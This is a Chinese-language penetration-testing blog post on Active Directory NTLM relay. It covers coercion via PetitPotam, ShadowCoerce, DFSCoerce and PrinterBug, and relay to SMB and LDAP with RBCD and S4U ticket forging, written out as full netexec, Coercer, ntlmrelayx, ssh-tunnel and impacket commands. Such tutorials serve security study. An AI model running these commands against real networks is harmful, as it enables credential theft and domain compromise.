@@ -1,0 +1,397 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 2 | ShadowMccc&#39;s Blog</title>
+  <meta name="author" content="ShadowMccc">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="ShadowMccc&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="ShadowMccc&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ShadowMccc&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>ShadowMccc&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Beneath this mask there is more than fIesh.Beneath this mask there is an idea, Mr. Creedy.And ideas are bulletproof.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/12/03/AD-NTLM Relay/" >AD-NTLM Relay</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-12-03  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1><span id="authentication-coercion">Authentication Coercion</span></h1><p>能够出现像强制身份认证这样的技术的根本原因是Windows 系统在尝试访问像 <code>\\172.16.117.30\file.txt</code> 这样的 UNC 路径时，会自动向其他计算机进行身份验证</p>
+<h2><span id="ms-efsr-abuse-petitpotam">MS-EFSR abuse (PetitPotam)</span></h2><h3><span id="理论">理论</span></h3><p><strong>MS-EFSR</strong> 是微软的加密文件系统远程协议（Encrypting File System Remote Protocol）。它执行对远程存储并通过网络访问的加密数据的维护和管理操作（来源：docs.microsoft.com），并作为一个 RPC 接口提供。该接口可以通过以下 SMB 命名管道访问：<code>\\pipe\\efsrpc</code>、<code>\\pipe\\lsarpc</code>、<code>\\pipe\\samr</code>、<code>\\pipe\\lsass</code> 和 <code>\\pipe\\netlogon</code>。MS-EFSR 滥用可以与 WebClient 滥用结合，诱导通过 HTTP 进行的传入身份验证，从而增强 NTLM 中继攻击的能力。</p>
+<p>以下是 MS-EFSR 方法存在的漏洞点：</p>
+<ul>
+<li><strong>EfsRpcEncryptFileSrv</strong>、<strong>EfsRpcDecryptFileSrv</strong>、<strong>EfsRpcQueryUsersOnFile</strong>、<strong>EfsRpcQueryRecoveryAgents</strong>、<strong>EfsRpcRemoveUsersFromFile</strong>、<strong>EfsRpcAddUsersToFile</strong>、<strong>EfsRpcFileKeyInfo</strong>、<strong>EfsRpcDuplicateEncryptionInfoFile</strong>、<strong>EfsRpcAddUsersToFileEx</strong>（部分已经被修复了）</li>
+</ul>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M petitpotam</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/22.png" alt="22"></p>
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name EfsRpcDecryptFileSrv -u &#x27;123&#x27; -p &#x27;123&#x27; -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/22-1.png" alt="22-1"></p>
+<h2><span id="ms-fsrvp-abuse-shadowcoerce">MS-FSRVP abuse (ShadowCoerce)</span></h2><h3><span id="理论">理论</span></h3><p><strong>MS-FSRVP</strong> 是微软的文件服务器远程 VSS 协议（File Server Remote VSS Protocol）。它用于在远程计算机上创建文件共享的影像副本，并协助备份应用程序执行应用程序一致性的备份和数据恢复，特别是在 SMB2 共享上（来源：docs.microsoft.com）。该接口可以通过 <code>\pipe\FssagentRpc</code> SMB 命名管道访问。</p>
+<p>与其他 MS-RPC 滥用类似，这种攻击方法是通过使用依赖于远程 UNC 路径的特定方法来实现的。MS-FSRVP 滥用似乎无法与 WebClient 滥用结合来诱导通过 HTTP 进行的传入身份验证。滥用的前提条件是目标服务器上必须启用 <strong>“文件服务器 VSS 代理服务”</strong>。</p>
+<p><img src="/images/23.png" alt="23"></p>
+<p>目前已知的利用接口：</p>
+<ul>
+<li><strong>IsPathShadowCopied</strong>、<strong>IsPathShadowCopiedResponse</strong>、<strong>IsPathSupported</strong>、<strong>IsPathSupportedResponse</strong></li>
+</ul>
+<p>2022年6月，微软在KB5014692中修复了CVE-2022-30154漏洞，同时也修复了此强制攻击。</p>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M shadowcoerce</span><br></pre></td></tr></table></figure>
+
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name IsPathShadowCopied -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ms-dfsnm-abuse-dfscoerce">MS-DFSNM abuse (DFSCoerce)</span></h2><h3><span id="理论">理论</span></h3><p>MS-DFSNM 是微软的分布式文件系统命名空间管理协议。它提供了一个 RPC 接口，用于管理 DFS 配置（docs.microsoft.com），并作为 RPC 接口提供。该接口可以通过 \pipe\netdfs SMB 命名管道访问。与其他 MS-RPC 滥用类似，这种攻击方法是通过使用依赖于远程 UNC 路径的特定方法来实现的。</p>
+<p>值得注意的是，这种强制攻击方法仅对域控制器有效。</p>
+<p>目前已知的利用接口：</p>
+<ul>
+<li><strong>NetrDfsRemoveStdRoot</strong>、<strong>NetrDfsAddStdRoot</strong></li>
+</ul>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M dfscoerce</span><br></pre></td></tr></table></figure>
+
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name NetrDfsRemoveStdRoot -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ms-rprn-abuse-printerbug">MS-RPRN abuse (PrinterBug)</span></h2><h3><span id="理论">理论</span></h3><p>微软的打印后台处理程序（Print Spooler）是一个处理打印任务和与打印相关的其他各种任务的服务。攻击者控制域用户&#x2F;计算机后，可以通过特定的 RPC 调用触发目标机器上的打印后台处理程序服务，使其进行身份验证，并将身份验证请求发送到攻击者选择的目标。这个漏洞被标记为“不会修复”，并且在所有 Windows 环境中默认启用（更多信息请见发现报告）。</p>
+<p>被强制的身份验证通过 SMB 协议进行。但 MS-RPRN 滥用可以与 WebClient 滥用结合，促使通过 HTTP 发起的传入身份验证，这增强了 NTLM 中继攻击的能力。</p>
+<p>目前已知的利用接口：</p>
+<ul>
+<li><strong>RpcRemoteFindFirstPrinterChangeNotificationEx</strong></li>
+</ul>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali netexec smb 192.168.1.1 -u 123 -p 123 -M printerbug</span><br></pre></td></tr></table></figure>
+
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-protocol-name MS-RPRN -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
+
+<h1><span id="ntlm-relay-over-smb-attack">NTLM Relay over SMB Attack</span></h1><h2><span id="场景">场景</span></h2><ul>
+<li>拥有域内一台Windows机器的权限，出网</li>
+<li>对域内某个用户有修改homeDirectory或者profilePath属性的权限</li>
+<li>一台没有启用smb签名的机器（目标）</li>
+</ul>
+<h2><span id="利用">利用</span></h2><h3><span id="通过smbtakeover接管445端口">通过smbtakeover接管445端口</span></h3><p>一定要确认没有人使用该机器的smb服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 smbtakeover.py -hashes :123123123123123123123 123.com/administrator@192.168.1.2 stop</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/24.png" alt="24"></p>
+<h3><span id="通过任意方式将该机器的445端口的流量转发到远程机器">通过任意方式将该机器的445端口的流量转发到远程机器</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:&gt; <span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=445 <span class="title">listenaddress</span>=0.0.0.0 <span class="title">connectport</span>=8445 <span class="title">connectaddress</span>=127.0.0.1</span></span><br><span class="line"><span class="function"><span class="title">C</span>:&gt; <span class="title">ssh.exe</span> -<span class="title">o</span> <span class="title">StrictHostKeyChecking</span>=<span class="title">no</span> -<span class="title">fNCg</span> -<span class="title">L</span> 8445:127.0.0.1:8445 <span class="title">user</span>@<span class="title">remoteaddr</span> -<span class="title">p</span> 22 -<span class="title">i</span> <span class="title">key</span></span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="在攻击机器上使用远程端口转发将远程端口的流量转发到本地">在攻击机器上使用远程端口转发，将远程端口的流量转发到本地</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali ssh -fNC -R 127.0.0.1:8445:127.0.0.1:445 user@remoteaddr -p 22 -i key.pem</span><br></pre></td></tr></table></figure>
+
+<h3><span id="在本地启动ntlmrelayx">在本地启动ntlmrelayx</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-ntlmrelayx -smb2support -t 192.168.1.5</span><br></pre></td></tr></table></figure>
+
+<h3><span id="修改用户的homedirectory">修改用户的homeDirectory</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains ldapmodify -x -H ldap://192.168.1.1:389 -D <span class="string">&#x27;administrator@root.local&#x27;</span> -w <span class="string">&#x27;ThisisPassw0rd!&#x27;</span> -f modify_user.ldif</span><br><span class="line"></span><br><span class="line">dn: CN=somebody,CN=Users,DC=123,DC=com</span><br><span class="line">changetype: modify</span><br><span class="line">replace: homeDirectory</span><br><span class="line">homeDirectory: //192.168.1.4/fdgdsgdsg</span><br></pre></td></tr></table></figure>
+
+<h3><span id="用户登录机器触发认证">用户登录机器触发认证</span></h3><p><img src="/images/25.png" alt="25"></p>
+<h1><span id="ntlm-relay-over-ldap-attack">NTLM Relay over LDAP Attack</span></h1><p>由于域控默认是开启了smb签名的，所以从smb中继到ldap一般来说是不太可行的，由于有的强制认证漏洞支持\\192.168.1.1@80的webdav的形式字符串，于是我们可以从http中继到ldap</p>
+<h2><span id="场景可以加机器">场景（可以加机器）</span></h2><ul>
+<li><p>一台启用了WebClient服务的机器（触发强制认证的目标）</p>
+</li>
+<li><p>域控</p>
+</li>
+<li><p>拥有域内一台Windows机器的权限，出网</p>
+</li>
+<li><p>拥有一个机器账户或者可以创建一个机器账户</p>
+</li>
+</ul>
+<h4><span id="注意">注意</span></h4><p>个人机器默认会安装webclient服务但是默认没有启动，可以上传<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry">searchConnector-ms</a>文件，当目标浏览包含该文件的文件夹时会触发webclient服务的启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;searchConnectorDescription xmlns=<span class="string">&quot;http://schemas.microsoft.com/windows/2009/searchConnector&quot;</span>&gt; &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt; &lt;description&gt;Microsoft Outlook&lt;/description&gt; &lt;isSearchOnlyItem&gt;<span class="literal">false</span>&lt;/isSearchOnlyItem&gt; &lt;includeInStartMenuScope&gt;<span class="literal">true</span>&lt;/includeInStartMenuScope&gt; &lt;iconReference&gt;https://&lt;strong&gt;&lt;em&gt;www.google.com&lt;/em&gt;&lt;/strong&gt;/0001.ico&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;&#123;91475FE5-586B-4EBA-8D75-D17434B8CDF6&#125;&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;simpleLocation&gt; &lt;url&gt;https://&lt;strong&gt;&lt;em&gt;www.google.com&lt;/em&gt;&lt;/strong&gt;/&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3><span id="使用netexec找webclient服务开启的机器">使用netexec找webclient服务开启的机器</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1/24 -u 123 -p <span class="string">&quot;123&quot;</span> -M webdav</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/26.png" alt="26"></p>
+<h3><span id="然后查看其是否存在强制认证漏洞">然后查看其是否存在强制认证漏洞</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali netexec smb 192.168.1.6 -u 123 -p <span class="string">&quot;123&quot;</span> -M petitpotam</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/27.png" alt="27"></p>
+<h3><span id="确定域控的ldaps没有启用-channel-binding">确定域控的ldaps没有启用 Channel Binding</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 LdapRelayScan.py -dc-ip 192.168.1.1 -u administrator -nthash 123123123123123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/28.png" alt="28"></p>
+<h3><span id="将已控的出网的windows的8081端口的流量转到vps上">将已控的出网的windows的8081端口的流量转到vps上</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">netsh</span> <span class="title">advfirewall</span> <span class="title">firewall</span> <span class="title">add</span> <span class="title">rule</span> <span class="title">name</span>=&quot;8081&quot; <span class="title">dir</span>=<span class="title">in</span> <span class="title">action</span>=<span class="title">allow</span> <span class="title">protocol</span>=<span class="title">TCP</span> <span class="title">localport</span>=8081</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">ssh.exe</span> -<span class="title">o</span> <span class="title">StrictHostKeyChecking</span>=<span class="title">no</span> -<span class="title">fNC</span> -<span class="title">L</span> 192.168.1.4:8081:127.0.0.1:8081 <span class="title">user</span>@<span class="title">remoteaddr</span> -<span class="title">p</span> 22 -<span class="title">i</span> .\<span class="title">key.pem</span></span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="将vps的流量转发到攻击机器">将vps的流量转发到攻击机器</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali ssh -fNC -R 127.0.0.1:8081:127.0.0.1:80 user@remoteaddr -p 22 -i key.pem</span><br></pre></td></tr></table></figure>
+
+<h3><span id="攻击机器启动ntlmrelayx以利用rbcd">攻击机器启动ntlmrelayx以利用RBCD</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-ntlmrelayx -smb2support -t ldap://10.0.0.2 --no-da --no-acl --delegate-access</span><br></pre></td></tr></table></figure>
+
+<h3><span id="使用coercer触发强制认证">使用Coercer触发强制认证</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type http --http-port 8081 --filter-method-name EfsRpcDecryptFileSrv -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/29.png" alt="29"></p>
+<h3><span id="使用impacket-getst进行完整的s4u获取票据">使用impacket-getST进行完整的S4U获取票据</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -spn cifs/123.123.com -impersonate administrator <span class="string">&#x27;123.com/HSJEXRLK$:5wfZ&#125;igoDlUeM:1&#x27;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/30.png" alt="30"></p>
+
+	
+	</div>
+  <a type="button" href="/2024/12/03/AD-NTLM Relay/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/3/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
+      </li>
+    
+      <li>
+        <a href="/2024/11/29/解密chrome浏览器账号密码/" ><i class="fa fa-file-o"></i>解密chrome浏览器账号密码</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 ShadowMccc's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
